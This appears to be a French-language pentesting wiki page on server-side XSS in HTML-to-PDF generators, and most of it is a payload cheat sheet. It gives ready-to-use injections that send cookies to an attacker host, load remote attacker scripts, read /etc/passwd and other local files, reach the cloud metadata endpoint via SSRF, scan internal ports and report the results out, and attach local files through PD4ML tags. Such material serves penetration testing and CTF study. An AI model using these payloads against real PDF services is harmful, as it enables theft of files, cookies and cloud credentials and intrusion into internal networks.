# Server Side XSS (Dynamic PDF)

{{#include ../../banners/hacktricks-training.md}}

## Server Side XSS (Dynamic PDF)

Si une page web crée un PDF en utilisant des entrées contrôlées par l'utilisateur, vous pouvez essayer de **tromper le bot** qui crée le PDF pour qu'il **exécute du code JS arbitraire**.\
Donc, si le **bot créateur de PDF trouve** une sorte de **tags HTML**, il va **les interpréter**, et vous pouvez **abuser** de ce comportement pour provoquer un **XSS Serveur**.

Veuillez noter que les tags `<script></script>` ne fonctionnent pas toujours, donc vous aurez besoin d'une méthode différente pour exécuter JS (par exemple, en abusant de `<img` ).\
De plus, notez que dans une exploitation régulière, vous serez **capable de voir/télécharger le PDF créé**, donc vous pourrez voir tout ce que vous **écrivez via JS** (en utilisant `document.write()` par exemple). Mais, si vous **ne pouvez pas voir** le PDF créé, vous aurez probablement besoin **d'extraire l'information en faisant des requêtes web vers vous** (Blind).

### Génération de PDF populaire

- **wkhtmltopdf** est connu pour sa capacité à convertir HTML et CSS en documents PDF, utilisant le moteur de rendu WebKit. Cet outil est disponible en tant qu'utilitaire en ligne de commande open-source, le rendant accessible pour une large gamme d'applications.
- **TCPDF** offre une solution robuste au sein de l'écosystème PHP pour la génération de PDF. Il est capable de gérer des images, des graphiques et le chiffrement, montrant sa polyvalence pour créer des documents complexes.
- Pour ceux qui travaillent dans un environnement Node.js, **PDFKit** présente une option viable. Il permet la génération de documents PDF directement à partir de HTML et CSS, fournissant un pont entre le contenu web et les formats imprimables.
- Les développeurs Java pourraient préférer **iText**, une bibliothèque qui facilite non seulement la création de PDF mais prend également en charge des fonctionnalités avancées comme les signatures numériques et le remplissage de formulaires. Son ensemble de fonctionnalités complet le rend adapté à la génération de documents sécurisés et interactifs.
- **FPDF** est une autre bibliothèque PHP, distinguée par sa simplicité et sa facilité d'utilisation. Elle est conçue pour les développeurs recherchant une approche simple pour la génération de PDF, sans avoir besoin de fonctionnalités étendues.

## Payloads

### Discovery
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

N'importe lequel des payloads précédents ou suivants peut être utilisé à l'intérieur de ce payload SVG. Un iframe accédant au sous-domaine Burpcollab et un autre accédant au point de terminaison des métadonnées sont donnés comme exemples.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
Vous pouvez trouver beaucoup **d'autres charges utiles SVG** dans [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

### Divulgation de chemin
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Charger un script externe

La meilleure façon conforme d'exploiter cette vulnérabilité est d'abuser de la vulnérabilité pour faire en sorte que le bot charge un script que vous contrôlez localement. Ensuite, vous pourrez modifier la charge utile localement et faire en sorte que le bot la charge avec le même code à chaque fois.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Lire un fichier local / SSRF

> [!WARNING]
> Changez `file:///etc/passwd` par `http://169.254.169.254/latest/user-data` par exemple pour **essayer d'accéder à une page web externe (SSRF)**.
>
> Si SSRF est autorisé, mais que vous **ne pouvez pas atteindre** un domaine ou une IP intéressants, [vérifiez cette page pour des contournements potentiels](../ssrf-server-side-request-forgery/url-format-bypass.md).
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### Délai du bot
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### Scan de Port
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

Cette vulnérabilité peut être transformée très facilement en SSRF (car vous pouvez faire en sorte que le script charge des ressources externes). Essayez donc de l'exploiter (lire des métadonnées ?).

### Attachments: PD4ML

Il existe des moteurs HTML 2 PDF qui permettent de **spécifier des pièces jointes pour le PDF**, comme **PD4ML**. Vous pouvez abuser de cette fonctionnalité pour **joindre n'importe quel fichier local** au PDF.\
Pour ouvrir la pièce jointe, j'ai ouvert le fichier avec **Firefox et double-cliqué sur le symbole du trombone** pour **enregistrer la pièce jointe** en tant que nouveau fichier.\
La capture de la **réponse PDF** avec burp devrait également **afficher la pièce jointe en texte clair** à l'intérieur du PDF.
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html>
<pd4ml:attachment
src="/etc/passwd"
description="attachment sample"
icon="Paperclip" />
</html>
```
## Références

- [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
- [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

{{#include ../../banners/hacktricks-training.md}}
